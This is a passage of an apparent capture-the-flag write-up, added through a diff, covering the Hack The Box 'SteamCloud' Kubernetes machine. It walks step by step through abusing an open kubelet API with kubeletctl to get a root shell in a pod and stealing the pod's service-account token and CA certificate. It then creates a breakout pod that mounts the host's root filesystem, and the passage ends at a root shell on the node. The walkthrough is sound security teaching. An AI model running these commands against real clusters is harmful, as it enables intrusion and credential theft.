style="color:#e6db74">&#34;kubernetes.io/config.hash&#34;</span>:<span style="color:#e6db74">&#34;967b9bee71f2e3cec06ff1dbde2a2a19&#34;</span>,<span style="color:#e6db74">&#34;kubernetes.io/config.seen&#34;</span>:<span style="color:#e6db74">&#34;2025-10-02T12:08:51.371667834-04:00&#34;</span>,<span style="color:#e6db74">&#34;kubernetes.io/config.source&#34;</span>:<span style="color:#e6db74">&#34;file&#34;</span><span style="color:#f92672">}}</span>
+</span></span></code></pre></div><p>We found the article by cyberark about kubelet client attack which shows how to use the different api endpoints manually to list pods or run the commands insides the container. While using this command one by one to find the token and go though the multiple directories it will be complicated and time consuming at the same time.</p>
+<p><strong>Kubelet API endpoints to perform the multiple task:</strong></p>
+<table>
+  <thead>
+      <tr>
+          <th>Kubelet API</th>
+          <th>Examples for use</th>
+          <th>Description</th>
+      </tr>
+  </thead>
+  <tbody>
+      <tr>
+          <td>/pods</td>
+          <td>GET <code>/pods</code></td>
+          <td>List the pods in the kubelet’s worker</td>
+      </tr>
+      <tr>
+          <td>/run</td>
+          <td>POST <code>/run/&lt;podNamespace&gt;/&lt;podID&gt;/&lt;containerName&gt;</code>  <!-- raw HTML omitted -->POST <code>/run/&lt;podNamespace&gt;/&lt;podID&gt;/&lt;uid&gt;/&lt;containerName&gt;</code>  <!-- raw HTML omitted -->Body: <code>&lt;command&gt;</code></td>
+          <td>Run command in a container</td>
+      </tr>
+      <tr>
+          <td>/exec</td>
+          <td>GET  <code>/exec/&lt;podNamespace&gt;/&lt;podID&gt;/&lt;containerName&gt;?command=&lt;command&gt;</code>  <!-- raw HTML omitted -->POST <code>/exec/&lt;podNamespace&gt;/&lt;podID&gt;/&lt;containerName&gt;?command=&lt;command&gt;  </code><!-- raw HTML omitted -->GET  <code>/exec/&lt;podNamespace&gt;/&lt;podID&gt;/&lt;uid&gt;/&lt;containerName&gt;?command=&lt;command&gt;</code>  <!-- raw HTML omitted -->POST <code>/exec/&lt;podNamespace&gt;/&lt;podID&gt;/&lt;uid&gt;/&lt;containerName&gt;?command=&lt;command&gt;</code></td>
+          <td>Run command using a stream in a container</td>
+      </tr>
+      <tr>
+          <td>/configz</td>
+          <td>GET <code>/configz</code></td>
+          <td>Kubelet’s configuration file settings</td>
+      </tr>
+      <tr>
+          <td>/debug</td>
+          <td>GET <code>/debug/flags/v</code><!-- raw HTML omitted -->PUT <code>/debug/flags/v (body: &lt;integer&gt;)  </code><!-- raw HTML omitted -->GET <code>/debug/pprof/&lt;profile&gt;</code></td>
+          <td>Debug information</td>
+      </tr>
+  </tbody>
+</table>
+<h3 id="kubeletctl">Kubeletctl</h3>
+<p>The above mentioned blog also mentions about the tool called kubeletctl which can be used to make command execution and pods listing process easy. If you are using mac to solve this problem you might face issue while installing and using the tool. It&rsquo;s recommended to use the docker image which can be easiest way to install and run the tool without facing any architecture or dependency related issue.</p>
+<p>List the running pods using below mentioned command and it will give the proper table format output.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>/ $ kubeletctl pods --server 10.10.11.133
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>┌────────────────────────────────────────────────────────────────────────────────┐
+</span></span><span style="display:flex;"><span>│                                Pods from Kubelet                               │
+</span></span><span style="display:flex;"><span>├───┬────────────────────────────────────┬─────────────┬─────────────────────────┤
+</span></span><span style="display:flex;"><span>│   │ POD                                │ NAMESPACE   │ CONTAINERS              │
+</span></span><span style="display:flex;"><span>├───┼────────────────────────────────────┼─────────────┼─────────────────────────┤
+</span></span><span style="display:flex;"><span>│ <span style="color:#ae81ff">1</span> │ coredns-78fcd69978-l4jd5           │ kube-system │ coredns                 │
+</span></span><span style="display:flex;"><span>│   │                                    │             │                         │
+</span></span><span style="display:flex;"><span>├───┼────────────────────────────────────┼─────────────┼─────────────────────────┤
+</span></span><span style="display:flex;"><span>│ <span style="color:#ae81ff">2</span> │ nginx                              │ default     │ nginx                   │
+</span></span><span style="display:flex;"><span>│   │                                    │             │                         │
+</span></span><span style="display:flex;"><span>├───┼────────────────────────────────────┼─────────────┼─────────────────────────┤
+</span></span><span style="display:flex;"><span>│ <span style="color:#ae81ff">3</span> │ etcd-steamcloud                    │ kube-system │ etcd                    │
+</span></span><span style="display:flex;"><span>│   │                                    │             │                         │
+</span></span><span style="display:flex;"><span>├───┼────────────────────────────────────┼─────────────┼─────────────────────────┤
+</span></span><span style="display:flex;"><span>│ <span style="color:#ae81ff">4</span> │ kube-apiserver-steamcloud          │ kube-system │ kube-apiserver          │
+</span></span><span style="display:flex;"><span>│   │                                    │             │                         │
+</span></span><span style="display:flex;"><span>├───┼────────────────────────────────────┼─────────────┼─────────────────────────┤
+</span></span><span style="display:flex;"><span>│ <span style="color:#ae81ff">5</span> │ kube-controller-manager-steamcloud │ kube-system │ kube-controller-manager │
+</span></span><span style="display:flex;"><span>│   │                                    │             │                         │
+</span></span><span style="display:flex;"><span>├───┼────────────────────────────────────┼─────────────┼─────────────────────────┤
+</span></span><span style="display:flex;"><span>│ <span style="color:#ae81ff">6</span> │ kube-scheduler-steamcloud          │ kube-system │ kube-scheduler          │
+</span></span><span style="display:flex;"><span>│   │                                    │             │                         │
+</span></span><span style="display:flex;"><span>├───┼────────────────────────────────────┼─────────────┼─────────────────────────┤
+</span></span><span style="display:flex;"><span>│ <span style="color:#ae81ff">7</span> │ storage-provisioner                │ kube-system │ storage-provisioner     │
+</span></span><span style="display:flex;"><span>│   │                                    │             │                         │
+</span></span><span style="display:flex;"><span>├───┼────────────────────────────────────┼─────────────┼─────────────────────────┤
+</span></span><span style="display:flex;"><span>│ <span style="color:#ae81ff">8</span> │ kube-proxy-5lw7m                   │ kube-system │ kube-proxy              │
+</span></span><span style="display:flex;"><span>│   │                                    │             │                         │
+</span></span><span style="display:flex;"><span>└───┴────────────────────────────────────┴─────────────┴─────────────────────────┘
+</span></span></code></pre></div><p>Scan for command execution related permission:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>kubeletctl scan rce --server 10.10.11.133
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>┌─────────────────────────────────────────────────────────────────────────────────────────────────────┐
+</span></span><span style="display:flex;"><span>│                                   Node with pods vulnerable to RCE                                  │
+</span></span><span style="display:flex;"><span>├───┬──────────────┬────────────────────────────────────┬─────────────┬─────────────────────────┬─────┤
+</span></span><span style="display:flex;"><span>│   │ NODE IP      │ PODS                               │ NAMESPACE   │ CONTAINERS              │ RCE │
+</span></span><span style="display:flex;"><span>├───┼──────────────┼────────────────────────────────────┼─────────────┼─────────────────────────┼─────┤
+</span></span><span style="display:flex;"><span>│   │              │                                    │             │                         │ RUN │
+</span></span><span style="display:flex;"><span>├───┼──────────────┼────────────────────────────────────┼─────────────┼─────────────────────────┼─────┤
+</span></span><span style="display:flex;"><span>│ <span style="color:#ae81ff">1</span> │ 10.10.11.133 │ kube-scheduler-steamcloud          │ kube-system │ kube-scheduler          │ -   │
+</span></span><span style="display:flex;"><span>├───┼──────────────┼────────────────────────────────────┼─────────────┼─────────────────────────┼─────┤
+</span></span><span style="display:flex;"><span>│ <span style="color:#ae81ff">2</span> │              │ storage-provisioner                │ kube-system │ storage-provisioner     │ -   │
+</span></span><span style="display:flex;"><span>├───┼──────────────┼────────────────────────────────────┼─────────────┼─────────────────────────┼─────┤
+</span></span><span style="display:flex;"><span>│ <span style="color:#ae81ff">3</span> │              │ kube-proxy-5lw7m                   │ kube-system │ kube-proxy              │ +   │
+</span></span><span style="display:flex;"><span>├───┼──────────────┼────────────────────────────────────┼─────────────┼─────────────────────────┼─────┤
+</span></span><span style="display:flex;"><span>│ <span style="color:#ae81ff">4</span> │              │ coredns-78fcd69978-l4jd5           │ kube-system │ coredns                 │ -   │
+</span></span><span style="display:flex;"><span>├───┼──────────────┼────────────────────────────────────┼─────────────┼─────────────────────────┼─────┤
+</span></span><span style="display:flex;"><span>│ <span style="color:#ae81ff">5</span> │              │ nginx                              │ default     │ nginx                   │ +   │
+</span></span><span style="display:flex;"><span>├───┼──────────────┼────────────────────────────────────┼─────────────┼─────────────────────────┼─────┤
+</span></span><span style="display:flex;"><span>│ <span style="color:#ae81ff">6</span> │              │ etcd-steamcloud                    │ kube-system │ etcd                    │ -   │
+</span></span><span style="display:flex;"><span>├───┼──────────────┼────────────────────────────────────┼─────────────┼─────────────────────────┼─────┤
+</span></span><span style="display:flex;"><span>│ <span style="color:#ae81ff">7</span> │              │ kube-apiserver-steamcloud          │ kube-system │ kube-apiserver          │ -   │
+</span></span><span style="display:flex;"><span>├───┼──────────────┼────────────────────────────────────┼─────────────┼─────────────────────────┼─────┤
+</span></span><span style="display:flex;"><span>│ <span style="color:#ae81ff">8</span> │              │ kube-controller-manager-steamcloud │ kube-system │ kube-controller-manager │ -   │
+</span></span><span style="display:flex;"><span>└───┴──────────────┴────────────────────────────────────┴─────────────┴─────────────────────────┴─────┘
+</span></span></code></pre></div><h2 id="getting-user-shell">Getting User shell</h2>
+<p>Based on <code>kubeletctl scan rce</code> command, We will go ahead and attack the ngnix pod and run the whoami command and it was observed that the pod is running as the root.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>/ $ kubeletctl exec <span style="color:#e6db74">&#34;whoami&#34;</span> -p nginx -c nginx --server 10.10.11.133
+</span></span><span style="display:flex;"><span>root
+</span></span></code></pre></div><p>Instead of passing command using the <code>kubeletctl exec</code> we can simply go ahead any take a shell so we can interact with a shell properly and do further enumeration to get the user flag.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>/ $ kubeletctl exec <span style="color:#e6db74">&#34;/bin/bash&#34;</span> -p nginx -c nginx --server 10.10.11.133
+</span></span><span style="display:flex;"><span>root@nginx:/#
+</span></span></code></pre></div><h3 id="user-flag-">User Flag 🚩</h3>
+<p>We have the shell. Let&rsquo;s read the user flag and move ahead for root flag.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>root@nginx:~# ls
+</span></span><span style="display:flex;"><span>user.txt
+</span></span><span style="display:flex;"><span>root@nginx:~# cat user.txt
+</span></span><span style="display:flex;"><span>REDECTED_FLAG_VALUE
+</span></span></code></pre></div><p>We already have the root user access but flag doesn&rsquo;t exist in the <code>/root</code> directory. We can check the env and mounted directory or we can run the linpeas as well.</p>
+<p><strong>The environment variables:</strong></p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>root@nginx:~# env
+</span></span><span style="display:flex;"><span>HOSTNAME<span style="color:#f92672">=</span>nginx
+</span></span><span style="display:flex;"><span>NJS_VERSION<span style="color:#f92672">=</span>1.14.2.0.2.6-1~stretch
+</span></span><span style="display:flex;"><span>NGINX_VERSION<span style="color:#f92672">=</span>1.14.2-1~stretch
+</span></span><span style="display:flex;"><span>KUBERNETES_PORT_443_TCP_PROTO<span style="color:#f92672">=</span>tcp
+</span></span><span style="display:flex;"><span>KUBERNETES_PORT_443_TCP_ADDR<span style="color:#f92672">=</span>10.96.0.1
+</span></span><span style="display:flex;"><span>KUBERNETES_PORT<span style="color:#f92672">=</span>tcp://10.96.0.1:443
+</span></span><span style="display:flex;"><span>PWD<span style="color:#f92672">=</span>/root
+</span></span><span style="display:flex;"><span>HOME<span style="color:#f92672">=</span>/root
+</span></span><span style="display:flex;"><span>KUBERNETES_SERVICE_PORT_HTTPS<span style="color:#f92672">=</span><span style="color:#ae81ff">443</span>
+</span></span><span style="display:flex;"><span>KUBERNETES_PORT_443_TCP_PORT<span style="color:#f92672">=</span><span style="color:#ae81ff">443</span>
+</span></span><span style="display:flex;"><span>KUBERNETES_PORT_443_TCP<span style="color:#f92672">=</span>tcp://10.96.0.1:443
+</span></span><span style="display:flex;"><span>TERM<span style="color:#f92672">=</span>xterm
+</span></span><span style="display:flex;"><span>SHLVL<span style="color:#f92672">=</span><span style="color:#ae81ff">1</span>
+</span></span><span style="display:flex;"><span>KUBERNETES_SERVICE_PORT<span style="color:#f92672">=</span><span style="color:#ae81ff">443</span>
+</span></span><span style="display:flex;"><span>PATH<span style="color:#f92672">=</span>/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
+</span></span><span style="display:flex;"><span>KUBERNETES_SERVICE_HOST<span style="color:#f92672">=</span>10.96.0.1
+</span></span><span style="display:flex;"><span>OLDPWD<span style="color:#f92672">=</span>/var/run/secrets/kubernetes.io/serviceaccount
+</span></span><span style="display:flex;"><span>_<span style="color:#f92672">=</span>/usr/bin/env
+</span></span></code></pre></div><p><strong>The mounted directory:</strong></p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>root@nginx:~# df -h
+</span></span><span style="display:flex;"><span>df -h
+</span></span><span style="display:flex;"><span>Filesystem      Size  Used Avail Use% Mounted on
+</span></span><span style="display:flex;"><span>overlay         8.9G  3.2G  5.6G  37% /
+</span></span><span style="display:flex;"><span>tmpfs            64M     <span style="color:#ae81ff">0</span>   64M   0% /dev
+</span></span><span style="display:flex;"><span>tmpfs           2.0G     <span style="color:#ae81ff">0</span>  2.0G   0% /sys/fs/cgroup
+</span></span><span style="display:flex;"><span>/dev/sda1       8.9G  3.2G  5.6G  37% /root
+</span></span><span style="display:flex;"><span>shm              64M     <span style="color:#ae81ff">0</span>   64M   0% /dev/shm
+</span></span><span style="display:flex;"><span>tmpfs           3.9G   12K  3.9G   1% /run/secrets/kubernetes.io/serviceaccount
+</span></span><span style="display:flex;"><span>tmpfs           2.0G     <span style="color:#ae81ff">0</span>  2.0G   0% /proc/acpi
+</span></span><span style="display:flex;"><span>tmpfs           2.0G     <span style="color:#ae81ff">0</span>  2.0G   0% /sys/firmware
+</span></span></code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>root@nginx:~# cd /run/secrets/kubernetes.io/serviceaccount
+</span></span><span style="display:flex;"><span>cd /run/secrets/kubernetes.io/serviceaccount
+</span></span><span style="display:flex;"><span>root@nginx:/run/secrets/kubernetes.io/serviceaccount# ls
+</span></span><span style="display:flex;"><span>ca.crt	namespace  token
+</span></span></code></pre></div><h2 id="what-is-a-kubernetes-serviceaccount">What is a Kubernetes Serviceaccount?</h2>
+<p>A <strong>ServiceAccount</strong> is an identity for processes running inside Pods. When a Pod runs, by default Kubernetes mounts credentials for a ServiceAccount into the Pod so the process can call the Kubernetes API as that identity. <strong>These credentials are how workloads authenticate to the API server.</strong></p>
+<h3 id="what-lives-at-runsecretskubernetesioserviceaccount-directory">What lives at /run/secrets/kubernetes.io/serviceaccount directory?</h3>
+<p>Inside most container images we&rsquo;ll see these files:</p>
+<ul>
+<li><code>token</code> - a JWT bearer token. This token lets the Pod authenticate to the API server.</li>
+<li><code>ca.crt</code> - CA certificate to validate the API server TLS certificate.</li>
+<li><code>namespace</code> - the namespace the Pod is running in.</li>
+</ul>
+<h3 id="why-this-matters-for-privilege-escalation">Why this matters for privilege escalation</h3>
+<p>If an attacker can read that <code>token</code> file inside a pod, they can use that token to call the Kubernetes API and act with whatever RBAC permissions the ServiceAccount has.</p>
+<ul>
+<li><strong>Discovery</strong>: enumerate pods, namespaces, secrets, nodes, roles.</li>
+<li><strong>Privilege escalation</strong>: if the service account has wide permissions, can create resources (new Pods, ClusterRoleBindings) to escalate to cluster-admin or access sensitive secrets such as cloud credentials.</li>
+<li><strong>Lateral movement</strong>: read secrets, mount host filesystem, create pods with host access to extract files.</li>
+</ul>
+<h2 id="privilege-escalation">Privilege Escalation</h2>
+<p>Let&rsquo;s go inside the <code>/run/secrets/kubernetes.io/serviceaccount</code> and save the CA.crt and token file in local system so we can use it to check the permission this token has.</p>
+<p><strong>Save the token:</strong>
+!()[/images/HTB/SteamCloud/3.png]]</p>
+<p><strong>Save the ca.crt:</strong>
+!()[/images/HTB/SteamCloud/4.png]]</p>
+<p>Now, Let&rsquo;s use the <strong>kubectl</strong> tool which <strong>allows user to interact with the Kubernetes API and the control plane</strong>.</p>
+<p>We tried to use this token with the server ip <code>10.10.11.133</code> with port <code>10250</code> but server send us the certificate validation related error.</p>
+<p><strong>Command:</strong></p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>kubectl --server https://10.10.11.133:10250 --certificate-authority<span style="color:#f92672">=</span>ca.crt --token<span style="color:#f92672">=</span>token get namespaces
+</span></span></code></pre></div><p><strong>Server Validation Error:</strong></p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>E1002 23:16:05.190516   <span style="color:#ae81ff">35485</span> memcache.go:265<span style="color:#f92672">]</span> <span style="color:#e6db74">&#34;Unhandled Error&#34;</span> err<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;couldn&#39;t get current server API group list: Get \&#34;https://10.10.11.133:10250/api?timeout=32s\&#34;: tls: failed to verify certificate: x509: cannot validate certificate for 10.10.11.133 because it doesn&#39;t contain any IP SANs&#34;</span>
+</span></span><span style="display:flex;"><span>E1002 23:16:05.890616   <span style="color:#ae81ff">35485</span> memcache.go:265<span style="color:#f92672">]</span> <span style="color:#e6db74">&#34;Unhandled Error&#34;</span> err<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;couldn&#39;t get current server API group list: Get \&#34;https://10.10.11.133:10250/api?timeout=32s\&#34;: tls: failed to verify certificate: x509: cannot validate certificate for 10.10.11.133 because it doesn&#39;t contain any IP SANs&#34;</span>
+</span></span></code></pre></div><p>We have updated the port number from <code>10250</code> to <code>8443</code>. The reason is we have seen the access forbidden error. Let&rsquo;s pass the token value and ca.crt file which will help server to validate the user access request.</p>
+<p>We tried to list he pods and we are able to list the pods. From here what we can do is check what kind of permission that token and use it to get root flag.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>kubectl --server https://10.10.11.133:8443 --certificate-authority<span style="color:#f92672">=</span>ca.crt --token<span style="color:#f92672">=</span>$token get pods
+</span></span><span style="display:flex;"><span>NAME    READY   STATUS    RESTARTS   AGE
+</span></span><span style="display:flex;"><span>nginx   1/1     Running   <span style="color:#ae81ff">0</span>          99m
+</span></span></code></pre></div><p><strong>User doesn&rsquo;t have permission to get namespace:</strong></p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>kubectl --server https://10.10.11.133:8443 --certificate-authority<span style="color:#f92672">=</span>ca.crt --token<span style="color:#f92672">=</span>$token get namespaces
+</span></span><span style="display:flex;"><span>Error from server <span style="color:#f92672">(</span>Forbidden<span style="color:#f92672">)</span>: namespaces is forbidden: User <span style="color:#e6db74">&#34;system:serviceaccount:default:default&#34;</span> cannot list resource <span style="color:#e6db74">&#34;namespaces&#34;</span> in API group <span style="color:#e6db74">&#34;&#34;</span> at the cluster scope
+</span></span></code></pre></div><p><strong>The user has permission to check permission:</strong></p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>kubectl --server https://10.10.11.133:8443 --certificate-authority<span style="color:#f92672">=</span>ca.crt --token<span style="color:#f92672">=</span>$token auth can-i --list
+</span></span><span style="display:flex;"><span>Resources                                       Non-Resource URLs                     Resource Names   Verbs
+</span></span><span style="display:flex;"><span>selfsubjectaccessreviews.authorization.k8s.io   <span style="color:#f92672">[]</span>                                    <span style="color:#f92672">[]</span>               <span style="color:#f92672">[</span>create<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>selfsubjectrulesreviews.authorization.k8s.io    <span style="color:#f92672">[]</span>                                    <span style="color:#f92672">[]</span>               <span style="color:#f92672">[</span>create<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>pods                                            <span style="color:#f92672">[]</span>                                    <span style="color:#f92672">[]</span>               <span style="color:#f92672">[</span>get create list<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>                                                <span style="color:#f92672">[</span>/.well-known/openid-configuration<span style="color:#f92672">]</span>   <span style="color:#f92672">[]</span>               <span style="color:#f92672">[</span>get<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>                                                <span style="color:#f92672">[</span>/api/*<span style="color:#f92672">]</span>                              <span style="color:#f92672">[]</span>               <span style="color:#f92672">[</span>get<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>                                                <span style="color:#f92672">[</span>/api<span style="color:#f92672">]</span>                                <span style="color:#f92672">[]</span>               <span style="color:#f92672">[</span>get<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>                                                <span style="color:#f92672">[</span>/apis/*<span style="color:#f92672">]</span>                             <span style="color:#f92672">[]</span>               <span style="color:#f92672">[</span>get<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>                                                <span style="color:#f92672">[</span>/apis<span style="color:#f92672">]</span>                               <span style="color:#f92672">[]</span>               <span style="color:#f92672">[</span>get<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>                                                <span style="color:#f92672">[</span>/healthz<span style="color:#f92672">]</span>                            <span style="color:#f92672">[]</span>               <span style="color:#f92672">[</span>get<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>                                                <span style="color:#f92672">[</span>/healthz<span style="color:#f92672">]</span>                            <span style="color:#f92672">[]</span>               <span style="color:#f92672">[</span>get<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>                                                <span style="color:#f92672">[</span>/livez<span style="color:#f92672">]</span>                              <span style="color:#f92672">[]</span>               <span style="color:#f92672">[</span>get<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>                                                <span style="color:#f92672">[</span>/livez<span style="color:#f92672">]</span>                              <span style="color:#f92672">[]</span>               <span style="color:#f92672">[</span>get<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>                                                <span style="color:#f92672">[</span>/openapi/*<span style="color:#f92672">]</span>                          <span style="color:#f92672">[]</span>               <span style="color:#f92672">[</span>get<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>                                                <span style="color:#f92672">[</span>/openapi<span style="color:#f92672">]</span>                            <span style="color:#f92672">[]</span>               <span style="color:#f92672">[</span>get<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>                                                <span style="color:#f92672">[</span>/openid/v1/jwks<span style="color:#f92672">]</span>                     <span style="color:#f92672">[]</span>               <span style="color:#f92672">[</span>get<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>                                                <span style="color:#f92672">[</span>/readyz<span style="color:#f92672">]</span>                             <span style="color:#f92672">[]</span>               <span style="color:#f92672">[</span>get<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>                                                <span style="color:#f92672">[</span>/readyz<span style="color:#f92672">]</span>                             <span style="color:#f92672">[]</span>               <span style="color:#f92672">[</span>get<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>                                                <span style="color:#f92672">[</span>/version/<span style="color:#f92672">]</span>                           <span style="color:#f92672">[]</span>               <span style="color:#f92672">[</span>get<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>                                                <span style="color:#f92672">[</span>/version/<span style="color:#f92672">]</span>                           <span style="color:#f92672">[]</span>               <span style="color:#f92672">[</span>get<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>                                                <span style="color:#f92672">[</span>/version<span style="color:#f92672">]</span>                            <span style="color:#f92672">[]</span>               <span style="color:#f92672">[</span>get<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>                                                <span style="color:#f92672">[</span>/version<span style="color:#f92672">]</span>                            <span style="color:#f92672">[]</span>               <span style="color:#f92672">[</span>get<span style="color:#f92672">]</span>
+</span></span></code></pre></div><p>List the permission table which shows user can get, create and list pods. Let&rsquo;s create a pod with accessive privilege which can be use to do pod breakout.</p>
+<p><strong>Pod creation policy, which can be used to do Pod Breakout:</strong></p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-yaml" data-lang="yaml"><span style="display:flex;"><span><span style="color:#f92672">apiVersion</span>: <span style="color:#ae81ff">v1</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">kind</span>: <span style="color:#ae81ff">Pod</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">metadata</span>:
+</span></span><span style="display:flex;"><span>  <span style="color:#f92672">name</span>: <span style="color:#ae81ff">breakout</span>
+</span></span><span style="display:flex;"><span>  <span style="color:#f92672">namespace</span>: <span style="color:#ae81ff">default</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">spec</span>:
+</span></span><span style="display:flex;"><span>  <span style="color:#f92672">hostNetwork</span>: <span style="color:#66d9ef">true</span>
+</span></span><span style="display:flex;"><span>  <span style="color:#f92672">automountServiceAccountToken</span>: <span style="color:#66d9ef">true</span>
+</span></span><span style="display:flex;"><span>  <span style="color:#f92672">containers</span>:
+</span></span><span style="display:flex;"><span>  - <span style="color:#f92672">name</span>: <span style="color:#ae81ff">breakout</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#f92672">image</span>: <span style="color:#ae81ff">nginx:latest</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#f92672">volumeMounts</span>:
+</span></span><span style="display:flex;"><span>    - <span style="color:#f92672">mountPath</span>: <span style="color:#ae81ff">/root</span>
+</span></span><span style="display:flex;"><span>      <span style="color:#f92672">name</span>: <span style="color:#ae81ff">mount-root</span>
+</span></span><span style="display:flex;"><span>  <span style="color:#f92672">volumes</span>:
+</span></span><span style="display:flex;"><span>  - <span style="color:#f92672">name</span>: <span style="color:#ae81ff">mount-root</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#f92672">hostPath</span>:
+</span></span><span style="display:flex;"><span>      <span style="color:#f92672">path</span>: <span style="color:#ae81ff">/</span>
+</span></span></code></pre></div><p><strong>Use Pod creation policy to create a pod with elevated privileges:</strong></p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>kubectl --server https://10.10.11.133:8443 --certificate-authority<span style="color:#f92672">=</span>ca.crt --token<span style="color:#f92672">=</span>$token apply -f Pod-Breakout.yaml
+</span></span><span style="display:flex;"><span>pod/breakout created
+</span></span></code></pre></div><p>You can also refer to the detailed blog presented <a href="https://bishopfox.com/blog/kubernetes-pod-privilege-escalation">bishopfox</a>. They have discussed 8 different scenarios based on the limited pod creation permission user has. Checkout the blog it&rsquo;s actually interesting one to read.</p>
+<p>Let&rsquo;s use the kubectl get pods command with the ca.crt file and token. It was observed that the pod we created is up and running. Let&rsquo;s move back to the kubeletctl tool because we don&rsquo;t have pod execution permission with the token we are using in the kubectl command.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>kubectl --server https://10.10.11.133:8443 --certificate-authority<span style="color:#f92672">=</span>ca.crt --token<span style="color:#f92672">=</span>$token get pods
+</span></span><span style="display:flex;"><span>NAME                          READY   STATUS             RESTARTS   AGE
+</span></span><span style="display:flex;"><span>breakout                      1/1     Running            <span style="color:#ae81ff">0</span>          36s
+</span></span><span style="display:flex;"><span>nginx                         1/1     Running            <span style="color:#ae81ff">0</span>          102m
+</span></span></code></pre></div><p>Run the kubeletctl with <code>whoami</code> command on the breakout pod, and we are already running as root.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>kubeletctl exec <span style="color:#e6db74">&#34;whoami&#34;</span> -p breakout -c breakout --server 10.10.11.133
+</span></span><span style="display:flex;"><span>root
+</span></span></code></pre></div><p>Let&rsquo;s take a shell</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>kubeletctl exec <span style="color:#e6db74">&#34;/bin/bash&#34;</span> -p breakout -c breakout --server 10.10.11.133
+</span></span><span style="display:flex;"><span>root@steamcloud:/#
